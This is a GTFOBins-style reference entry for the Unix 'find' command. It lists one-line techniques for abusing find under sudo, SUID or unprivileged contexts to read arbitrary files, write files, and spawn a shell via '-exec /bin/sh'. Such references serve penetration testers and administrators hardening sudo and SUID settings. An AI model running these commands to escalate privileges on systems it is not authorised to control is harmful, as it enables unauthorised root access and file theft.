---
type: gtfobin
name: find
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# find

## file-read

```bash
find /path/to/input-file -exec cat {} \;
```
_This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
find / -fprintf /path/to/output-file DATA -quit
```
_`DATA` is a format string, it supports some escape sequences._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
find . -exec /bin/sh \; -quit
```
**Contexts:** sudo, suid, unprivileged
